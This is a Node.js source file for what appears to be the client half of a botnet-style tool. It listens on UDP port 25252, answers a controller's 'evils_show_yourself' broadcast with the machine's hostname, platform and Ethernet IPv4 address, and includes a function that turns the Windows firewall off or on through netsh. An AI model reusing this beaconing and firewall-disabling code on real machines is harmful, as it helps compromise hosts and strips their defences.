const dgram = require('dgram');
const os = require('os');
const exec = require('child_process').exec;
const _ = require('underscore');

var client = dgram.createSocket('udp4');
var PORT = 25252;

/* Client events section. */
client.on('listening', function() {
    var address = client.address();
    console.log('UDP Client listening on ' + address.address + ":" + address.port);
    client.setBroadcast(true);
});

client.on('message', function(bufMsg, rinfo) {
    var message = JSON.parse(bufMsg.toString());
    switch (message.id) {
        case "time_to_shutup":

            break;

        case "evils_show_yourself":
            console.log('Receiving \"evils_show_yourself\" packet.');
            var respond = Buffer.from(JSON.stringify(setEvilAddressInfo()));
            client.send(respond, 0, respond.length, rinfo.port, rinfo.address, function(err) {
                if (err)
                    console.log(err);
                else
                    console.log("Respond to server with my evil information.");
            });
            break;

        default:
            break;
    }
});

/* socket bind. */
client.bind(PORT);




/** clients utility functions. */
/*
    init: initial function.
    param: 
    Tested: not test yet.
*/
init = function() {

}

/*
    setEvialAddressInfo: set up evil's IPv4 address information.
*/
setEvilAddressInfo = function() {
    var info = {};
    info.id = "evilInfo";
    info.hostname = os.hostname();
    info.platform = os.platform();
    info.address = getNetworkInterfacesAddress();
    return info;
}

/*
    getNetworkInterfacesAddress: Get network interface 乙太網路's IPv4 address.
    param: NONE
    Tested: pass
*/
getNetworkInterfacesAddress = function() {
    let listInterfaces = os.networkInterfaces();
    let result;

    _.each(listInterfaces, function(arrayInterfaceInfo, interfaceName) {
        _.each(arrayInterfaceInfo, function(element, index) {
            if (element.family == "IPv4" && !element.internal && interfaceName == "乙太網路")
                result = element.address;
        });
    });

    return result;
}

/*
    enableFirewall: control windows firewall state, enable or disable firewall.
    param: boolean.
    Tested: pass
*/
enableFirewall = function(bool) {
    let strControl = bool ? "on": "off";
    let command = `netsh advfirewall set currentprofile state ${strControl}`;

    const child = exec(command,
        (error, stdout, stderr) => {
            console.log(`stdout: ${stdout}`);
            console.log(`stderr: ${stderr}`);
            if (error !== null) {
                console.log(`exec error: ${error}`);
            }
        });
}

/*
    
*/